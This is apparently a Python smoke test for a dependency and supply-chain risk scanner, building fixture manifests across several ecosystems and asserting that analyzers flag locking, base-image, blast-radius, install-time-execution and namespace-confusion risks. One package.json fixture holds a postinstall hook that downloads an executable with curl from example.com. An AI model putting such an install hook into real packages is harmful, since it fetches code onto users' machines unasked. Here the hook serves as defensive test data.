import json
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from app.services.parsers import parse_manifest
from app.services.risk_analyzer import analyze_dependency_risks
from app.services.blast_radius_analyzer import analyze_blast_radius
from app.services.capability_analyzer import analyze_capabilities
from app.services.exposure_scorer import aggregate_exposure, apply_banking_exposure_scores
from app.services.namespace_guard import analyze_namespace_risks
from app.schemas.scan import ManifestReport, Severity


def main() -> None:
    temp_dir = Path(tempfile.mkdtemp())

    requirements = temp_dir / "requirements.txt"
    requirements.write_text("fastapi==0.115.6\nrequests>=2\n", encoding="utf-8")

    package_json = temp_dir / "package.json"
    package_json.write_text(
        json.dumps(
            {
                "scripts": {"postinstall": "node install.js && curl https://example.com/tool.exe"},
                "dependencies": {"lodash": "4.17.21", "react": "^18.2.0", "jsonwebtoken": "8.5.1", "core-auth-utils": "1.0.0"},
                "devDependencies": {"vite": "5.0.0"},
            }
        ),
        encoding="utf-8",
    )
    npmrc = temp_dir / ".npmrc"
    npmrc.write_text("@uco:registry=https://registry.npmjs.org\n", encoding="utf-8")

    go_mod = temp_dir / "go.mod"
    go_mod.write_text("module demo\n\ngo 1.22\n\nrequire github.com/gin-gonic/gin v1.10.0\n", encoding="utf-8")

    cargo_lock = temp_dir / "Cargo.lock"
    cargo_lock.write_text('[[package]]\nname = "serde"\nversion = "1.0.203"\n', encoding="utf-8")

    csproj = temp_dir / "Demo.csproj"
    csproj.write_text('<Project><ItemGroup><PackageReference Include="Newtonsoft.Json" Version="13.0.3" /></ItemGroup></Project>', encoding="utf-8")

    composer_lock = temp_dir / "composer.lock"
    composer_lock.write_text(json.dumps({"packages": [{"name": "monolog/monolog", "version": "3.6.0"}]}), encoding="utf-8")

    gem_lock = temp_dir / "Gemfile.lock"
    gem_lock.write_text("GEM\n  specs:\n    rails (7.1.3)\n", encoding="utf-8")

    dockerfile = temp_dir / "Dockerfile"
    dockerfile.write_text("FROM node:latest\n", encoding="utf-8")

    auth_file = temp_dir / "authController.js"
    auth_file.write_text(
        "const jwt = require('jsonwebtoken');\n"
        "router.post('/api/auth/login', function login(req, res) {\n"
        "  return jwt.verify(req.body.token, process.env.JWT_SECRET);\n"
        "});\n",
        encoding="utf-8",
    )

    deps = (
        parse_manifest(requirements, include_dev=True)
        + parse_manifest(package_json, include_dev=True)
        + parse_manifest(go_mod, include_dev=True)
        + parse_manifest(cargo_lock, include_dev=True)
        + parse_manifest(csproj, include_dev=True)
        + parse_manifest(composer_lock, include_dev=True)
        + parse_manifest(gem_lock, include_dev=True)
        + parse_manifest(dockerfile, include_dev=True)
    )
    names = {(dep.name, dep.version, dep.ecosystem, dep.scope) for dep in deps}

    assert ("fastapi", "0.115.6", "PyPI", "runtime") in names
    assert ("requests", None, "PyPI", "runtime") in names
    assert ("lodash", "4.17.21", "npm", "runtime") in names
    assert ("react", None, "npm", "runtime") in names
    assert ("jsonwebtoken", "8.5.1", "npm", "runtime") in names
    assert ("core-auth-utils", "1.0.0", "npm", "runtime") in names
    assert ("vite", "5.0.0", "npm", "development") in names
    assert ("github.com/gin-gonic/gin", "1.10.0", "Go", "runtime") in names
    assert ("serde", "1.0.203", "crates.io", "runtime") in names
    assert ("Newtonsoft.Json", "13.0.3", "NuGet", "runtime") in names
    assert ("monolog/monolog", "3.6.0", "Packagist", "runtime") in names
    assert ("rails", "7.1.3", "RubyGems", "runtime") in names
    assert ("node", "latest", "Docker", "runtime") in names

    risks = analyze_dependency_risks(
        temp_dir,
        [ManifestReport(path=str(package_json), type="package.json", dependency_count=3), ManifestReport(path=str(dockerfile), type="Dockerfile", dependency_count=1)],
        deps,
    )
    assert any(risk.category == "container-base-image" for risk in risks)
    assert any(risk.category == "dependency-locking" for risk in risks)
    chains = analyze_blast_radius(temp_dir, deps, [], risks)
    capabilities = analyze_capabilities(temp_dir)
    namespace_risks = analyze_namespace_risks(temp_dir, deps)
    apply_banking_exposure_scores(chains, [], risks, capabilities, namespace_risks)
    exposure = aggregate_exposure(chains)
    assert any("authentication" in chain.sensitive_contexts for chain in chains)
    assert any(chain.severity in {Severity.high, Severity.medium} for chain in chains)
    assert any(step.kind == "import" and step.line_number == 1 for chain in chains for step in chain.trace)
    assert any(step.kind == "route" and "/api/auth/login" in step.label for chain in chains for step in chain.trace)
    assert any(step.kind == "sensitive-use" and "jwt.verify" in (step.code or "") for chain in chains for step in chain.trace)
    assert any(finding.capability == "install-time-exec" for finding in capabilities)
    assert any(risk.category == "namespace-confusion" for risk in namespace_risks)
    assert exposure.score > 0

    print("smoke test passed")


if __name__ == "__main__":
    main()
